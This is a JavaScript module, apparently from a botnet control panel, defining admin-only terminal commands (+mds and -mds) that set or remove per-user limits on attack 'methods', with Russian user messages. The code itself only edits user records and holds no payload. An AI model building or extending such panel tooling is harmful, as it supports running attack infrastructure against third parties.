const CommandsCore = require('../../core')
const CommonData = require('../../../../common/data')
const center = require('../../../../utils/center')
const Botnet = require('../../../../botnet/core')
const { clearWithLogo } = require('../../../../utils/logo')

CommandsCore.cmdInit(/^\+mds ([A-Za-z0-9]+) ([A-Za-z0-9\.\-_\+]+) ([A-Za-z0-9\.\-_]+) ([A-Za-z0-9]+)$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    const username = args[1];
    const method = args[2].trim()
    const key = args[3].trim()
    let value = args[4].trim()

    const user = CommonData.users.find(x => x.username === args[1])
    if(!user) {
        return client.write(center('Пользователь не найден.'.red.italic, client.getWidth()) + '\n\n')
    }

    if(!user.limits) user.limits = {}
    if(!user.limits.methods) user.limits.methods = {}

    try {
        if(!user.limits.methods[method]) user.limits.methods[method] = {}
        user.limits.methods[method][key] = value
        client.write(center(`Значение установлено.`.bgGreen.brightWhite, client.getWidth()) + '\n\n')
    } catch {
        client.write(center('Произошла ошибка.'.red.italic, client.getWidth()) + '\n\n')
    }

    return;
})

CommandsCore.cmdInit(/^-mds ([A-Za-z0-9]+) ([A-Za-z0-9\.\-_\+]+) ([A-Za-z0-9\.\-_]+)$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    const username = args[1];
    const method = args[2].trim()
    const key = args[3].trim()

    const user = CommonData.users.find(x => x.username === args[1])
    if(!user) {
        return client.write(center('Пользователь не найден.'.red.italic, client.getWidth()) + '\n\n')
    }

    if(!user.limits) user.limits = {}
    if(!user.limits.methods) user.limits.methods = {}

    try {
        if(user.limits.methods[method]) {
            delete user.limits.methods[method][key]
        }
        client.write(center(`Значение удалено.`.bgRed.brightWhite, client.getWidth()) + '\n\n')
    } catch {
        client.write(center('Произошла ошибка.'.red.italic, client.getWidth()) + '\n\n')
    }

    return;
})

CommandsCore.cmdInit(/^-mds ([A-Za-z0-9]+) ([A-Za-z0-9\.\-_\+]+)$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    const username = args[1];
    const method = args[2].trim()

    const user = CommonData.users.find(x => x.username === args[1])
    if(!user) {
        return client.write(center('Пользователь не найден.'.red.italic, client.getWidth()) + '\n\n')
    }

    if(!user.limits) user.limits = {}
    if(!user.limits.methods) user.limits.methods = {}

    try {
        if(user.limits.methods[method]) delete user.limits.methods[method]
        client.write(center(`Метод удалён.`.bgRed.brightWhite, client.getWidth()) + '\n\n')
    } catch {
        client.write(center('Произошла ошибка.'.red.italic, client.getWidth()) + '\n\n')
    }

    return;
})